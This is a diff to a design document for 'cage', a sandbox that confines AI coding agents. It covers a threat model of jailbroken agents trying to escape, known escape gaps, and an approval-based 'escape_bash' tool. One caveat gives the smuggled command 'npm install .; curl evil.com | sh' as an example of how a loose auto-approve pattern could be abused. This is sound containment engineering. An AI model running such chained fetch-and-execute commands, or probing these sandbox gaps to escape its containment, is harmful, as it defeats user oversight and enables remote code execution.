@@ -13,7 +13,7 @@
 cage opencode
 cage --policy strict claude
 cage --allow-network codex
-cage --policy build aider
+cage --policy strict aider
 cage --policy strict ./build.sh
 cage python script.py
 ```
@@ -38,7 +38,9 @@ cage python script.py
 
 ## 2. Threat Model
 
-The target threat is a **process that is confused, buggy, or misconfigured** — not a sophisticated attacker with kernel-exploit capability.
+The target threat is a **process that is confused, buggy, misconfigured, or deliberately misled** — not a sophisticated attacker with kernel-exploit capability.
+
+AI agents may be jailbroken or deliberately prompted to escape the sandbox. We defend against deliberate but non-sophisticated escape attempts (filesystem tricks, network exfiltration, path probing). We do not defend against kernel exploits or advanced persistent threats—use VMs or containers for that level of isolation.
 
 | Threat | Linux | macOS | Windows |
 |---|---|---|---|
@@ -61,6 +63,7 @@ The target threat is a **process that is confused, buggy, or misconfigured** —
 | Gap | Detail | Mitigation |
 |---|---|---|
 | Symlink/TOCTOU on macOS/Windows | Seatbelt and Windows ACLs may follow symlinks to paths outside the sandbox. | Bubblewrap on Linux uses mount namespaces (immune). macOS/Windows: accepted risk for the "confused process" threat model. |
+| /proc isolation on Linux | Sandboxed process could introspect host processes via /proc. | Bubblewrap creates a new PID namespace by default—the sandboxed process sees only its own process tree in /proc, not host PIDs. |
 | Docker socket (`/var/run/docker.sock`) | A process with write access to the Docker socket can spawn containers with host mounts, escaping the sandbox. | Connecting to a Unix socket requires write permission on the socket file. Since `/var/run/docker.sock` is not in any writable root, this is blocked by default. |
 | Windows `%TEMP%` gap | Directories where `Everyone` has write access cannot be blocked by restricted token + ACLs. | Accepted limitation. WFP firewall blocks exfiltration. Temp dir cleaned on exit. See §5.3 and §13. |
 | Bubblewrap user namespace requirement | Some enterprise/container environments disable unprivileged user namespaces. | cage requires either unprivileged user namespaces or a setuid `bwrap` binary. Clear error message if unavailable. |
@@ -106,7 +109,7 @@ $ cage opencode
         - Else if command matches a `command_policy` pattern, use mapped policy
         - Else use "default" policy (or fail if no default exists)
 3.  Prepare environment:
-      - Create temp dir: /tmp/cage-$PID/
+      - Create temp dir: /tmp/cage-$PID-$RANDOM/ (PID for traceability, random suffix for security)
       - Copy/symlink declared passthrough configs (read-only)
       - Set up environment variables based on policy
 4.  Platform-specific sandbox setup:
@@ -136,9 +139,9 @@ $ cage opencode
 # ── Named policies ──────────────────────────────────────────────────────────
 
 [policies.default]
-writable_roots = ["$CWD", "$TMPDIR", "$HOME/.cache"]
-write_restricted_paths = ["$CWD/.git", "$CWD/.env", "$HOME/.ssh", "$HOME/.gnupg", "$HOME/.aws", "$HOME/.config"]
-read_restricted_paths = []
+writable_roots = ["$CWD", "$TMPDIR", "~/.cache"]
+write_restricted_paths = ["$CWD/.git", "$CWD/.env", "~/.ssh", "~/.gnupg", "~/.aws", "~/.config"]
+read_restricted_paths = ["~/.ssh", "~/.aws", "~/.gnupg"]  # Block common secret paths; add more gradually
 network = "full"
 [policies.default.env]
 mode = "blocklist"
@@ -155,26 +158,6 @@ mode = "allowlist"                    # "allowlist" | "blocklist"
 allow = ["PATH"]                      # for allowlist mode: only these vars
 # block = ["SECRET_*"]                # for blocklist mode: exclude these
 set = { CAGE = "1" }                  # always set these
-
-[policies.build]
-writable_roots = ["$CWD", "~/.cache/cargo", "~/.gradle", "~/.cache/pip"]
-write_restricted_paths = ["$CWD/.git"]  # protect git history
-read_restricted_paths = []              # no read restrictions
-network = "localhost"
-[policies.build.env]
-mode = "allowlist"
-allow = ["PATH", "CARGO_HOME", "JAVA_HOME", "GOPATH", "TERM", "LANG"]
-set = { CAGE = "1" }
-
-[policies.deploy]
-writable_roots = ["$CWD"]
-write_restricted_paths = ["$CWD/.git"]
-read_restricted_paths = ["~/.ssh", "~/.gnupg"]
-network = "full"
-[policies.deploy.env]
-mode = "blocklist"                    # inherit most vars, exclude sensitive ones
-block = ["GITHUB_TOKEN", "AWS_SECRET_*", "*_PASSWORD", "*_KEY"]
-set = { CAGE = "1" }
 
 # Phase 3: Domain-filtered network access (via built-in proxy)
 # [policies.web-build]
@@ -199,13 +182,13 @@ Path values in the config support variable expansion:
 
 ```toml
 # Unix example
-writable_roots = ["$CWD", "$HOME/.cache", "$TMPDIR", "$XDG_CACHE_HOME"]
+writable_roots = ["$CWD", "~/.cache", "$TMPDIR", "$XDG_CACHE_HOME"]
 
 # Windows example
-writable_roots = ["$CWD", "$USERPROFILE\\.cache", "$TEMP", "$LOCALAPPDATA"]
+writable_roots = ["$CWD", "~\\.cache", "$TEMP", "$LOCALAPPDATA"]
 ```
 
-Variables are resolved at policy application time. If an environment variable is not set, it expands to an empty string (which may cause errors if the path becomes invalid).
+Variables are resolved at policy application time. If an environment variable is not set, the path item is removed from the list (not an error).
 
 # ── Command to policy mappings ───────────────────────────────────────────────
 # Map specific commands to default policies. The first matching pattern is used.
@@ -223,27 +206,19 @@ Variables are resolved at policy application time. If an environment variable is
 
 [[command_policy]]
 pattern = "opencode"
-policy = "build"
+policy = "default"
 
 [[command_policy]]
 pattern = "codex"
-policy = "build"
+policy = "default"
 
 [[command_policy]]
 pattern = "claude"
-policy = "build"
+policy = "default"
 
 [[command_policy]]
 pattern = "aider"
 policy = "strict"
-
-[[command_policy]]
-pattern = "npm"
-policy = "build"
-
-[[command_policy]]
-pattern = "cargo"
-policy = "build"
 
 # ── Platform-specific overrides ──────────────────────────────────────────────
 
@@ -264,18 +239,20 @@ cage_group = "CageUsers"
 Multiple named policies can be composed with `+`:
 
 ```
-cage --policy build+strict-net opencode
+cage --policy default+strict opencode
 ```
 
-Merge rules:
-- `writable_roots`: **union** (most permissive)
-- `write_restricted_paths`: **union** (all blocked paths from merged policies)
-- `read_restricted_paths`: **union** (all blocked paths from merged policies)
-- `network`: **most restrictive wins** (`none` > `localhost` > `proxy` > `full`)
-- `env.mode`: if any policy uses `allowlist`, result is `allowlist` (most restrictive); otherwise `blocklist`
+Merge rules (permitting mode — merging adds permissions):
+- `writable_roots`: **union** (all writable paths from merged policies)
+- `write_restricted_paths`: **intersection** (only restrict if ALL policies agree)
+- `read_restricted_paths`: **intersection** (only restrict if ALL policies agree)
+- `network`: **most permissive wins** (`full` > `localhost` > `none`)
+- `env.mode`: if any policy uses `blocklist`, result is `blocklist` (more permissive); otherwise `allowlist`
 - `env.allow`: **union** (all allowed vars from merged policies)
-- `env.block`: **intersection** (only blocks vars all policies agree to block)
+- `env.block`: **intersection** (only block if ALL policies agree)
 - `env.set`: **union** (later policies override earlier for same keys)
+
+**Merge principle:** In permitting mode, merged policies combine their allowances. Restrictions use intersection (more permissive), permissions use union (more permissive).
 
 ### 4.3 Network policy levels
 
@@ -296,7 +273,6 @@ pub struct SandboxPolicy {
     pub read_restricted_paths: Vec<PathBuf>,   // paths blocked from reading
     pub network: NetworkPolicy,
     pub env: EnvPolicy,
-    pub extra_blocked_execs: Vec<PathBuf>,
 }
 
 pub enum NetworkPolicy {
@@ -386,6 +362,8 @@ bwrap \
 - `--dev /dev` and `--proc /proc` for device nodes and process info
 - All paths remain at their original locations (no remapping by default)
 
+**PID namespace:** Bubblewrap creates a new PID namespace by default (via `--unshare-pid` implicit). The sandboxed process sees only its own process tree in `/proc`, not host PIDs. This prevents `/proc` introspection of host processes.
+
 **Network setup:**
 
 | Policy level | Bubblewrap flags | Seccomp | Effect |
@@ -398,8 +376,10 @@ bwrap \
 
 **MCP sockets:** Bind-mount Unix socket paths into the namespace:
 ```sh
---ro-bind /run/mcp/server.sock /run/mcp/server.sock
+--bind /run/mcp/server.sock /run/mcp/server.sock
 ```
+
+Note: Unix domain sockets require write permission to connect. Use `--bind` (read-write), not `--ro-bind`.
 
 **Degradation:** If unprivileged user namespaces are disabled and `bwrap` is not setuid, exit with a clear error message suggesting the user either enable user namespaces or install a setuid `bwrap`.
 
@@ -448,7 +428,7 @@ bwrap \
 
 **Key constraints:**
 - The profile **must be generated at runtime**. Static profiles don't work because writable paths include `$CWD` which is only known at invocation time.
-- Seatbelt rules on specific paths (especially `/private/var` and Homebrew paths) can break across macOS versions. Build a runtime check: if `sandbox-exec` exits with a sandbox-violation error before the agent produces output, log it clearly and optionally retry with a relaxed profile or `--no-sandbox`.
+- **TODO:** Properly escape `$CWD` and other paths when substituting into SBPL profile. Research SBPL escaping rules during implementation (special characters like `)`, `"`, `\` could inject rules).
 - The `(allow default)` at the top means reads are allowed everywhere by default. Specific paths can be blocked with `(deny file-read*)` rules, which is how `read_restricted_paths` is implemented. This works well for blocking sensitive directories like `~/.ssh` while allowing general filesystem access.
 - **`write_restricted_paths`:** Implemented via `(deny file-write* (subpath "..."))` rules placed after the `(allow file-write* ...)` rules. In Seatbelt, later deny rules override earlier allows, so this works natively.
 
@@ -499,11 +479,17 @@ CreateProcessWithToken(restricted_token, "agent.exe ...")
 [on exit]: Remove WFP rule, clean up ACLs
 ```
 
+**Signal handling:** Unlike Linux/macOS where `exec()` replaces the cage process, on Windows `CreateProcessWithToken` keeps cage as the parent process. Explicit signal forwarding (Ctrl+C, Ctrl+Break) must be implemented to properly terminate the sandboxed process.
+
 **Implementation approach:** Implement our own Windows sandbox module based on this approach. The `windows-sandbox-rs` crate depends on internal Codex workspace crates (`codex-protocol`, `codex-utils-absolute-path`, etc.) that are not published to crates.io, so we cannot vendor just `lib.rs`. Instead, write our own module using the Windows APIs directly:
 
 - `windows` crate (v0.58) for `CreateRestrictedToken`, ACL functions, WFP APIs
 - `windows-sys` crate (v0.52) for lower-level system calls
 - Reference their implementation (~500 lines) for the approach, but use our own `SandboxPolicy` type
+
+**TODOs for implementation:**
+- **WFP SID scoping:** Research Codex `windows-sandbox-rs` implementation for proper SID scoping. The restricted token uses the same user SID as the normal user; WFP must distinguish sandboxed vs unsandboxed processes.
+- **Concurrent sessions:** Research how to handle multiple concurrent cage sessions. May need unique session SIDs (via `SidsToRestrict`) so WFP rules don't conflict between sessions.
 
 **Alternatives rejected:**
 
@@ -524,13 +510,13 @@ CreateProcessWithToken(restricted_token, "agent.exe ...")
 
 ### 6.1 Session temporary directory
 
-Each `cage` session creates a temporary directory (`/tmp/cage-$PID/`) for session-specific state. This is **not** the `HOME` directory — the user's real home remains accessible at its normal path. The session directory can be used for:
+Each `cage` session creates a temporary directory (`/tmp/cage-$PID-$RANDOM/`) for session-specific state. This is **not** the `HOME` directory — the user's real home remains accessible at its normal path. The session directory can be used for:
 - Audit logs of denied accesses
 - Temporary caches that shouldn't persist
 - Debug output
 
 ```
-/tmp/cage-$PID/
+/tmp/cage-$PID-$RANDOM/
 ├── audit.log                   # log of policy violations
 ├── cache/                      # ephemeral cache dir
 └── ...                         # other session-specific files
@@ -560,7 +546,7 @@ allow = ["PATH", "TERM"]
 set = { CAGE = "1" }
 
 # Exclude sensitive credentials only
-[policies.build.env]
+[policies.default.env]
 mode = "blocklist"
 block = ["*_TOKEN", "*_SECRET", "*_PASSWORD", "AWS_*"]
 set = { CAGE = "1" }
@@ -574,9 +560,11 @@ MCP servers communicate over Unix domain sockets (Linux/macOS) or named pipes (W
 
 **Linux (bubblewrap):** Bind-mount the socket path into the namespace:
 ```sh
---ro-bind /run/mcp/server.sock /run/mcp/server.sock
+--bind /run/mcp/server.sock /run/mcp/server.sock
 ```
 The seccomp filter (when used for `localhost` network policy) explicitly allows `AF_UNIX` connections.
+
+**TODO:** Research MCP socket path discovery mechanism. Currently using hardcoded path for Phase 1.
 
 **macOS (Seatbelt):** The profile includes `(allow network-outbound (remote unix-socket))`. The socket path must also be readable (allowed by `(allow default)`).
 
@@ -615,6 +603,7 @@ OPTIONS:
     -p, --policy <NAME>             Named policy (default: "default"). Phase 2: supports NAME+NAME composition.
         --allow-network             Shorthand: use current policy but override network to "full"
         --no-sandbox                Run command unsandboxed (logs a warning)
+        --config <PATH>             Use alternative config file instead of ~/.config/cage/cage.toml
         --passthrough <PATH>        Add an extra read-only passthrough path (repeatable)
         --writable <PATH>           Add an extra writable root (repeatable)
         --write-restrict <PATH>     Add an extra write-restricted path (repeatable)
@@ -625,10 +614,10 @@ OPTIONS:
     -V, --version                   Print version
 
 EXAMPLES:
-    cage opencode                       # Uses 'build' policy (from command_policy mapping)
-    cage --allow-network claude         # Uses 'build' policy + adds network access
+    cage opencode                       # Uses 'default' policy (from command_policy mapping)
+    cage --allow-network claude         # Uses 'default' policy + adds network access
     cage --policy strict codex          # Overrides default, uses 'strict' policy
-    cage --policy deploy ./build.sh
+    cage --policy strict ./build.sh
     cage --no-sandbox npm test
 ```
 
@@ -639,12 +628,16 @@ EXAMPLES:
 **Use case:** Allow agents to request execution of commands outside the sandbox for global operations (system package installs, global tool configuration, accessing credentials outside the project directory).
 
 **Two MCP tools:**
-- `escape_bash` - Execute command outside sandbox; approval via user-defined pattern matching, smart safety check, or explicit user prompt
+- `escape_bash` - Execute command outside sandbox; approval via user-defined pattern matching (with optional enhanced safety checks), or explicit user prompt
 - `escape_bash_ask` - Always prompts user for approval (no auto-approve, regardless of pattern matching rules)
 
 **Design intent:** Agents should prefer regular sandboxed execution. Escape is a last resort for operations that genuinely cannot work inside the sandbox (e.g., system package installs, global tool configuration). Agents should not routinely use escape for convenience.
 
 **Security:** All escape calls are logged regardless of approval method. Each call is limited to a single command execution. Full host access when approved.
+
+**Pattern matching note:** Auto-approve patterns must be carefully designed. Glob patterns (e.g., `npm install *`) can be dangerous—an agent could run `npm install .; curl evil.com | sh`. Recommend exact-match patterns where possible.
+
+**Enhanced safety checks:** Beyond simple pattern matching, an optional "smart safety check" layer (e.g., semantic analysis, command structure validation) could provide additional protection. **TODO:** Design enhanced safety check mechanism for Phase 3.
 
 ---
 
@@ -655,11 +648,17 @@ EXAMPLES:
 ### Phase 1a — Core Platforms (Weeks 1-3)
 
 - [ ] Policy config loading and merging
+- [ ] Command-to-policy mappings (`command_policy` config)
 - [ ] Environment setup and temp dir isolation (§6)
 - [ ] Linux: bubblewrap launcher with bind mounts (network: `none` and `full` only)
+- [ ] Linux: MCP socket passthrough
 - [ ] macOS: Seatbelt profile generator + `sandbox-exec` exec
+- [ ] macOS: MCP socket passthrough
 - [ ] CLI interface and default policy
 - [ ] Variable expansion ($CWD, $VAR)
+- [ ] Integration tests: verify write_restricted_paths denies writes
+- [ ] Integration tests: verify network policies block/allow correctly
+- [ ] Integration tests: verify read_restricted_paths denies reads
 
 ### Phase 1b — Windows + Localhost Network (Weeks 4-5)
 
@@ -669,13 +668,13 @@ EXAMPLES:
 - [ ] Windows: WFP firewall integration
 - [ ] Windows: `cage-setup.exe` installer (one-time, requires admin)
 - [ ] Windows: Testing and validation
-- [ ] MCP socket passthrough (all platforms)
+- [ ] Windows: MCP socket passthrough
 - [ ] Cleanup on exit (temp dirs, Windows firewall rules)
+- [ ] Integration tests for Windows sandbox
 
 ### Phase 2 — Enhanced Features (Weeks 6-7)
 
 - [ ] Policy composition (`--policy a+b`)
-- [ ] Command-to-policy mappings (`command_policy` in config)
 - [ ] Config validation (detect conflicting settings)
 - [ ] Structured audit log of denied accesses
 
@@ -724,13 +723,6 @@ Implement our own Windows sandbox module using the `windows` and `windows-sys` c
 ---
 
 ## 13. Security Notes
-
-### macOS Seatbelt degradation
-
-Seatbelt profile rules can silently stop working after OS updates. Mitigation:
-- On startup, run a probe: attempt a write to a path that should be denied; if it succeeds, the profile is broken
-- If `fail_on_sandbox_error = true` (default), abort with a clear error
-- If `fail_on_sandbox_error = false`, warn and run unsandboxed
 
 ### Environment variable injection
 
